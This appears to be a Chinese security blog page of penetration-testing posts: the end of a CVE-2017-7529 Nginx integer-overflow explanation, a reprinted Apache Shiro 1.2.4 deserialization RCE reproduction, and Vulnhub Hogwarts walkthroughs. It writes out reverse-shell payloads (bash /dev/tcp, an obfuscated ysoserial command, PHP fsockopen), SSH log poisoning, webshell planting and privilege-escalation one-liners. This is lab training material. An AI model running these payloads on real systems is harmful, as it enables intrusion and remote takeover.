<p>如上图，使用 -end 只设置一个大于8935的值，此时statr &#x3D; 8935-9000 &#x3D; -65，满足了负值。但按上文所说，statr是负值则会报错。<br>注意到此时并未报错，而是正常返回，原因是此处设置的range不是完整模式，虽然是负值，但是因为end的默认值是总长-1（8935-1&#x3D;8934），那么此时这段要读取的range的范围是从 -65到 8934 其实际总长超过了 8935 所以nginx丢弃了range，所以正常返回。</p>
</blockquote>
<h2><span id="重点">重点</span></h2><blockquote>
<p>上面满足了传值为负值的条件，但是因为总长度检测的原因，导致丢弃range，那么如果绕过总长度检测？为什么这个漏洞要叫 整数溢出 漏洞呢？<br>这里注意到 ***start, end, size均为64位有符号整形，值的范围是-9223372036854775808 … 9223372036854775807 ，那么根据补丁中的代码 size +&#x3D; end - start</p>
<p><img src="/2022/08/08/CVE-2017-7529-Nginx/8.png" alt="image"></p>
<p>只要最终size的值是负值，即可溢出，从而绕过检测，所以叫 整数溢出<br>0x8000 0000 0000 0000既是64位有符号型的最小负值，所以只需要最终相加得到的size为0×8000000000000000即可。</p>
<p>注意 size +&#x3D; end -start;这等于如果存在多个range，那么就会有 size &#x3D; size + (end - start)<br>也就是说在有多个range时，最终的size &#x3D; size1 + size2 + … +sizeN<br>如上所说，只要size是负值即可溢出，那么就能得到第二个range的值，若第一个range是9500<br>那么0x8000000000000000-9500 既是第二个值</p>
<p>那么如下图：</p>
<p><img src="/2022/08/08/CVE-2017-7529-Nginx/9.png" alt="image"></p>
<p>成功！</p>
</blockquote>
<h2><span id="结果">结果</span></h2><blockquote>
<p><img src="/2022/08/08/CVE-2017-7529-Nginx/10.png" alt="image"></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nginx/" rel="tag">Nginx</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2022/08/08/Shiro-RememberMe-1-2-4/">
                Shiro RememberMe 1.2.4
            </a>
        </h2>
    
    <time>
        Aug 8, 2022
    </time>
    <section class="content">
        <h1><span id="shiro-rememberme-124-反序列化命令执行漏洞复现-kali-docker">Shiro RememberMe 1.2.4 反序列化命令执行漏洞复现 kali docker</span></h1><blockquote>
<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44067239/article/details/106918315">莫憨憨</a></p>
</blockquote>
<h3><span id="影响版本apache-shiro-ltx3d-124">影响版本：Apache Shiro &lt;&#x3D; 1.2.4</span></h3><h2><span id="漏洞产生原因">漏洞产生原因:</span></h2><blockquote>
<p>shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化。<br>然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。使用大佬脚本生成 payload(ysoserial.jar文件和运行目录处于同一目录)</p>
</blockquote>
<h2><span id="漏洞环境搭建">漏洞环境搭建</span></h2><h3><span id="1拉取镜像">1.拉取镜像</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>

<h3><span id="2启动环境">2.启动环境</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:8080 -p 7777:6666 medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如需进入环境，命令为</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it name /bin/bash</span><br></pre></td></tr></table></figure>

<h3><span id="3web访问">3.web访问</span></h3><blockquote>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a> 能看到如下页面即可</p>
<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/1.png" alt="image"></p>
<p>或虚拟机外面用真实ip访问</p>
<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/2.png" alt="image"></p>
<p>至此漏洞环境搭建成功</p>
</blockquote>
<h2><span id="漏洞复现">漏洞复现</span></h2><h3><span id="1抓包测试">1.抓包测试</span></h3><blockquote>
<p>查看返回包里setcookie有rememberme的字样</p>
<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/3.png" alt="image"></p>
</blockquote>
<h3><span id="2继续测试">2.继续测试</span></h3><blockquote>
<p>首先最简单的测试方法是用dnslog，看看是否有回显。<br>利用POC生成想要执行的命令对应的rememberMe</p>
</blockquote>
<h3><span id="3工具准备">3.工具准备</span></h3><blockquote>
<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/4.png" alt="image"></p>
<p>生成payload的脚本使用的是python3,运行报错就安装一下模块</p>
</blockquote>
<h3><span id="4生成payload">4.生成payload：</span></h3><blockquote>
<p>双引号中是想要执行的命令，如果这里没有公网VPS，就用dnslog来证明。攻击原理一样，不认可的杠精可直接怼</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 shiro_1.2.4.py <span class="string">&quot;ping 39p2wo.dnslog.cn&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>运行结果如下图：</p>
<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/5.png" alt="image"></p>
<p>然后便会在脚本所在目录下生成文件payload.cookie</p>
</blockquote>
<h3><span id="5回到浏览器抓包">5.回到浏览器抓包</span></h3><blockquote>
<p>用payload.cookie中的rememberMe内容加入Cookie中，或者直接放进参数中，提交看页面回显和dnslog页面是否有数据过去</p>
</blockquote>
<h3><span id="6到ceye平台查看日志记录">6.到ceye平台查看日志记录</span></h3><blockquote>
<p>dnslog日志刷新后有记录了，说明payloda执行成功</p>
<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/6.png" alt="image"></p>
</blockquote>
<h2><span id="反弹shell">反弹shell</span></h2><blockquote>
<p>当然了，有VPS的情况下，为何不反弹一下shell呢？</p>
</blockquote>
<h3><span id="1使用脚本生成key">1.使用脚本生成key</span></h3><blockquote>
<p>反弹shell的命令：<code>bash -i &gt;&amp; /dev/tcp/22.45.13.9/7878 0&gt;&amp;1</code></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 shiro_1.2.4.py <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/22.45.13.9/7878 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>PS：ip假的，不打码，观看流畅</p>
</blockquote>
<h3><span id="2先公网vps监听反弹shell的命令">2.先公网VPS监听反弹shell的命令</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7878</span><br></pre></td></tr></table></figure>

<blockquote>
<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/7.png" alt="image"></p>
</blockquote>
<h3><span id="3加入payload提交数据包">3.加入payload，提交数据包</span></h3><blockquote>
<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/8.png" alt="image"></p>
<p>这里使用curl也能达到burp的效果</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 加 -I 是只看响应头，这里主要关注set-cookie:rememberMe</span><br><span class="line">curl -X GET http://172.16.12.132 --cookie “xxxxxxxxxxxxx” -I</span><br></pre></td></tr></table></figure>

<blockquote>
<p>讲这个是因为此方法可以用来初步探测shiro信息</p>
<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/9.png" alt="image"></p>
</blockquote>
<h3><span id="4vps收到了反弹回来的shell">4.vps收到了反弹回来的shell</span></h3><blockquote>
<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/10.png" alt="image"></p>
</blockquote>
<h2><span id="题外话1">题外话1</span></h2><blockquote>
<p>研究这个漏洞，是因为客户要求排查下资产，然后找不到集成的工具和一键式检查的。<br>漏洞的事情OK了，还是觉得自己太菜，要是代码够给力，写个集成的丢github上就真的香。</p>
</blockquote>
<h2><span id="题外话2">题外话2</span></h2><blockquote>
<p>还有一个思路，看大佬文章时，这里一直没搞懂。字面意思是用ysoserial中的JRMP监听模块来搞定的，后续学会了再补上笔记</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 3888 CommonsCollections5 <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/11.png" alt="image"></p>
</blockquote>
<h2><span id="参考链接">参考链接：</span></h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0007eafd1f92">https://www.jianshu.com/p/0007eafd1f92</a><br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/112742.html">https://www.secpulse.com/archives/112742.html</a></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2022/08/08/Hogwarts-Dobby/">
                Hogwarts Dobby
            </a>
        </h2>
    
    <time>
        Aug 8, 2022
    </time>
    <section class="content">
        <h1><span id="hogwarts-dobby">HOGWARTS: DOBBY</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
<h4><span id="名称hogwarts-dobby">名称：Hogwarts: Dobby</span></h4><h4><span id="发布日期2020118">发布日期：2020.11.8</span></h4><h4><span id="作者bly">作者：BLY</span></h4><h4><span id="系列hogwarts">系列：Hogwarts</span></h4><h4><span id="推特bertrandlorent9">推特：@BertrandLorent9</span></h4></blockquote>
<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;proof.txt </p>
<h4><span id="难度简单">难度：简单</span></h4></blockquote>
<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
<h4><span id="文件名dobbyova">文件名：dobby.ova</span></h4><h4><span id="文件大小37gb">文件大小：3.7GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagehogwartsdobbyova">下载地址：</span></h4><h4><span id="md5-11b9fd40b70344a71b432a608ee640ab">MD5: 11B9FD40B70344A71B432A608EE640AB</span></h4><h4><span id="sha1-68110b92fd58d6a4c8f0cdbe169e29259ac797a6">SHA1: 68110B92FD58D6A4C8F0CDBE169E29259AC797A6</span></h4></blockquote>
<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
<p>1.将靶机dobby和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
<p><img src="/2022/08/08/Hogwarts-Dobby/1.png" alt="image-"></p>
</blockquote>
<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Hogwarts-Dobby/2.png" alt="image-"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Hogwarts-Dobby/3.png" alt="image-"></p>
<p>2.再进行端口扫描，发现只开放了80端口，访问主页，还是apache的默认页，但源码有路径提示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.126 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Hogwarts-Dobby/4.png" alt="image-"></p>
<p><img src="/2022/08/08/Hogwarts-Dobby/5.png" alt="image-"></p>
<p>3.最后再进行一下目录扫描，&#x2F;log目录值得关注一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.126 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Hogwarts-Dobby/6.png" alt="image-"></p>
</blockquote>
<h3><span id="网页发现">网页发现</span></h3><blockquote>
<p>1.访问&#x2F;alohomora目录，发现Draco用户的密码提示：</p>
<p><img src="/2022/08/08/Hogwarts-Dobby/7.png" alt="image-"></p>
<p>2.访问&#x2F;log目录，发现直接提示了一个密码和路径：</p>
<p><img src="/2022/08/08/Hogwarts-Dobby/8.png" alt="image-"></p>
<p>3.继续访问&#x2F;DiagonAlley，发现一串brainfuck编码，且这个页面是用wordpress搭建的：</p>
<p><img src="/2022/08/08/Hogwarts-Dobby/9.png" alt="image-"></p>
<p>4.将brainfuck字串解码，但解出来是乱码：</p>
<p><img src="/2022/08/08/Hogwarts-Dobby/10.png" alt="image-"></p>
</blockquote>
<h3><span id="wordpress后台登录写入shell">Wordpress后台登录，写入shell</span></h3><blockquote>
<p>1.再从wordpress入手，用wpscan进行扫描，但没有过多问题：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.56.126/DiagonAlley --detection-mode aggressive</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Hogwarts-Dobby/11.png" alt="image-"></p>
<p>2.进入wp-login.php后台页，我们有用户draco，而提示他的马的名字slytherin就是密码：</p>
<p><img src="/2022/08/08/Hogwarts-Dobby/12.png" alt="image-"></p>
<p>3.进入wordpress后台后，对kali自带的webshell，&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php进行ip及端口修改，在Apariencia-Editor de temas-Error 404页写入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/share/webshells/php/php-reverse-shell.php</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Hogwarts-Dobby/13.png" alt="image-"></p>
<p><img src="/2022/08/08/Hogwarts-Dobby/14.png" alt="image-"></p>
<p>4.在kali开启对应端口监听，访问&#x2F;DiagonAlley目录下不存在页即可触发shell，再利用python构建交互式shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9001</span><br><span class="line"></span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Hogwarts-Dobby/15.png" alt="image-"></p>
<p><img src="/2022/08/08/Hogwarts-Dobby/16.png" alt="image-"></p>
</blockquote>
<h3><span id="root提权">root提权</span></h3><blockquote>
<p>1.查找有suid的文件，发现find：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null | grep usr/bin</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Hogwarts-Dobby/17.png" alt="image-"></p>
<p>2.利用find可以直接提权到root：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -exec /bin/sh -p \; -quit</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Hogwarts-Dobby/18.png" alt="image-"></p>
</blockquote>
<h3><span id="flag获取">Flag获取</span></h3><blockquote>
<p>1.现在我们在&#x2F;root目录下能够发现flag，即proof.txt：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">vi proof.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Hogwarts-Dobby/19.png" alt="image-"></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Hogwarts/" rel="tag">Hogwarts</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2022/08/08/Hogwarts-Bellatrix/">
                Hogwarts Bellatrix
            </a>
        </h2>
    
    <time>
        Aug 8, 2022
    </time>
    <section class="content">
        <h1><span id="hogwarts-bellatrix">HOGWARTS: BELLATRIX</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
<h4><span id="名称hogwarts-bellatrix">名称：Hogwarts: Bellatrix</span></h4><h4><span id="发布日期20201128">发布日期：2020.11.28</span></h4><h4><span id="作者bly">作者：BLY</span></h4><h4><span id="系列hogwarts">系列：Hogwarts</span></h4><h4><span id="推特bertrandlorent9">推特：@BertrandLorent9</span></h4></blockquote>
<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt </p>
<h4><span id="难度简单">难度：简单</span></h4></blockquote>
<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
<h4><span id="文件名bellatrixova">文件名：Bellatrix.ova</span></h4><h4><span id="文件大小41gb">文件大小：4.1GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagehogwartsbellatrixova">下载地址：</span></h4><h4><span id="md5-e6d98d406cdf7641e4a966f16afaf536">MD5: E6D98D406CDF7641E4A966F16AFAF536</span></h4><h4><span id="sha1-8389861c7f2b1626190844e31a2a1a4ade385e06">SHA1: 8389861C7F2B1626190844E31A2A1A4ADE385E06</span></h4></blockquote>
<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
<p>1.将靶机Bellatrix和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
<p><img src="/2022/08/08/Hogwarts-Bellatrix/1.png" alt="image-"></p>
</blockquote>
<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Hogwarts-Bellatrix/2.png" alt="image-"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Hogwarts-Bellatrix/3.png" alt="image-"></p>
<p>2.再进行端口扫描，发现只开放了22和80端口，访问主页，发现提示存在文件包含：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.127 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Hogwarts-Bellatrix/4.png" alt="image-"></p>
<p><img src="/2022/08/08/Hogwarts-Bellatrix/5.png" alt="image-"></p>
<p>3.最后再进行一下目录扫描，没有太多值得关注的信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.127 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Hogwarts-Bellatrix/6.png" alt="image-"></p>
</blockquote>
<h3><span id="文件包含漏洞利用">文件包含漏洞利用</span></h3><blockquote>
<p>1.在主页其实是提示了有ikilledsiriusblack.php这个文件，后面跟file参数存在文件包含漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/etc/passwd</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Hogwarts-Bellatrix/7.png" alt="image-"></p>
<p>2.利用文件包含漏洞，写入payload，获得shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/var/log/auth.log，可以查看SSH日志信息</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Hogwarts-Bellatrix/8.png" alt="image-"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh &#x27;&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;&#x27;@192.168.56.127，稍微污染SSH日志信息</span><br><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/var/log/auth.log&amp;cmd=id，可以使用cmd命令</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Hogwarts-Bellatrix/9.png" alt="image-"></p>
<p><img src="/2022/08/08/Hogwarts-Bellatrix/10.png" alt="image-"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br><span class="line"></span><br><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/var/log/auth.log&amp;cmd=php+-r+&#x27;$sock%3dfsockopen(&quot;192.168.56.102&quot;,1234)%3bexec(&quot;/bin/sh+-i+&lt;%263+&gt;%263+2&gt;%263&quot;)%3b&#x27;，写入命令反弹shell</span><br><span class="line"></span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Hogwarts-Bellatrix/11.png" alt="image-"></p>
</blockquote>
<h3><span id="密码爆破初步提权">密码爆破，初步提权</span></h3><blockquote>
<p>1.我们可以在当前目录下发现一个被类似base编码了的目录，目录下有一个隐藏的字典文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br><span class="line">cd c2VjcmV0cw==</span><br><span class="line">ls -la</span><br><span class="line">cat .secret.dic</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Hogwarts-Bellatrix/12.png" alt="image-"></p>
<p>2.而Swordofgryffindor内是lestrange用户与其密码hash：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat Swordofgryffindor</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Hogwarts-Bellatrix/13.png" alt="image-"></p>
<p>3.将密码字典复制与密码hash到kali本地，利用john进行爆破：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim dic.txt</span><br><span class="line">vim hash.txt</span><br><span class="line">john --wordlist=dic.txt hash.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Hogwarts-Bellatrix/14.png" alt="image-"></p>
<p>4.可以登录到lestrange用户：</p>
<p><img src="/2022/08/08/Hogwarts-Bellatrix/15.png" alt="image-"></p>
</blockquote>
<h3><span id="root提权">root提权</span></h3><blockquote>
<p>1.利用sudo -l命令，查找可用文件，发现vim可以提权：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Hogwarts-Bellatrix/16.png" alt="image-"></p>
<p>2.直接写入，提权到root：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/vim -c &#x27;:!/bin/sh&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Hogwarts-Bellatrix/17.png" alt="image-"></p>
</blockquote>
<h3><span id="flag获取">Flag获取</span></h3><blockquote>
<p>1.现在我们在&#x2F;root目录下能够发现flag，即proof.txt：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/Hogwarts-Bellatrix/18.png" alt="image-"></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Hogwarts/" rel="tag">Hogwarts</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2022/08/08/Harrypotter-Na/">
                Hogwarts Nagini
            </a>
        </h2>
    
    <time>
        Aug 8, 2022
    </time>
    <section class="content">
        <h1><span id="harrypotternagini">HarryPotter:Nagini</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
<h4><span id="名称hogwarts-nagini">名称：Hogwarts: Nagini</span></h4><h4><span id="发布日期2021429">发布日期：2021.4.29</span></h4><h4><span id="作者mansoor-r">作者：Mansoor R</span></h4><h4><span id="系列hogwarts">系列：Hogwarts</span></h4><h4><span id="推特time4ster">推特：@time4ster</span></h4></blockquote>
<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
<h4><span id="flags">Flags：</span></h4><p>www-data:&#x2F;var&#x2F;www&#x2F;html&#x2F;horcrux1.txt<br>hermoine:&#x2F;root&#x2F;horcrux2.txt<br>root:&#x2F;root&#x2F;horcrux3.txt</p>
<h4><span id="难度困难">难度：困难</span></h4></blockquote>
<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
<h4><span id="文件名naginiova">文件名：Nagini.ova</span></h4><h4><span id="文件大小741mb">文件大小：741MB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomharrypotternaginiova">下载地址：</span></h4><h4><span id="md5-b6c8f47bfb2421d1f12b6c1a2c095088">MD5: B6C8F47BFB2421D1F12B6C1A2C095088</span></h4><h4><span id="sha1-5cf128c51a445434e216a8c5f4087d9ecfb96739">SHA1: 5CF128C51A445434E216A8C5F4087D9ECFB96739</span></h4></blockquote>
<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
<p>1.将靶机Nagini和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
<p><img src="/2022/08/08/Harrypotter-Na/1.png" alt="image-"></p>
</blockquote>
<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
